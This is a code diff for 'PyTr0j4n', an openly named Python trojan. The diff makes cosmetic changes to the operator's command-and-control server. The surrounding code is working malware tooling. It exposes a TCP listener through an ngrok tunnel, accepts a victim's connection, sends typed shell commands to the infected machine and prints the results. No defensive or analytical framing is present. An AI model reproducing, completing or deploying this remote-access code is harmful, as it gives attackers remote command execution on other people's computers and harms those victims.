@@ -26,21 +26,21 @@ class PyTr0j4n:
             self.public_url = ngrok.connect(port, "tcp")
             print(f"{COLOR_GREEN}[*] Ngrok tunnel created: {self.public_url.public_url}")
         except Exception as e:
-            print(f"{COLOR_RED} Error creating ngrok tunnel: {e}")
+            print(f"{COLOR_RED}[*] Error creating ngrok tunnel: {e}")
             return None
 
     def startServer(self):
         try:
             self.createNgrokTunnel(self.port)
             if not self.public_url:
-                print(f"{COLOR_RED} [!] Unable to create ngrok tunnel. Exiting.")
+                print(f"{COLOR_RED}[!] Unable to create ngrok tunnel. Exiting.")
                 return
 
             print(f"{COLOR_GREEN}[*] Listening on {self.public_url.public_url}")
 
             self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.server.bind((self.host, self.port))
-            self.server.listen(5)
+            self.server.listen(1)
             print(f"{COLOR_GREEN}[*] Listening on {self.host}:{self.port}")
             self.acceptConnections()
         except Exception as e:
@@ -49,18 +49,19 @@ class PyTr0j4n:
 
     def handleClient(self, client_socket, client_address):
         try:
-            print(f"{COLOR_GREEN}[*] Accepted connection from {client_address[0]}:{client_address[1]}\n")
+            print(f"{COLOR_GREEN}[*] Accepted connection from {COLOR_RESET}{client_address[0]}:{client_address[1]}\n")
             while True:
-                response = input(f"{COLOR_YELLOW}Enter command (or '/exit' to quit): \n")
+                response = input("Enter command (or '/exit' to quit): \n")
                 if(response.lower() == "exit"):
                     self.stopServer()
+                    quit()
                 client_socket.sendall(response.encode('utf-8'))
                 data = client_socket.recv(1024)
                 if not data:
                     break
                 print(f"{COLOR_RESET}{data.decode('utf-8')}")
         except Exception as e:
-            print(f"{COLOR_RED} Error handling client: {e}")
+            print(f"{COLOR_RED}[*] Error handling client: {e}")
         finally:
             client_socket.close()
 
@@ -90,6 +91,6 @@ if __name__ == "__main__":
     print(COLOR_BLUE + banners.getBanner())
     print(f"\t{COLOR_BLUE}Author: {COLOR_RESET}Kayan Tchian | {COLOR_BLUE}GitHub: {COLOR_RESET}kayantchian\n")
     print(f"{COLOR_GREEN}[*] Welcome to PyTr0j4n")
-    print(f"{COLOR_BLUE}[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n\n")
+    print(f"{COLOR_YELLOW}[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n\n")
     time.sleep(3)
     main()
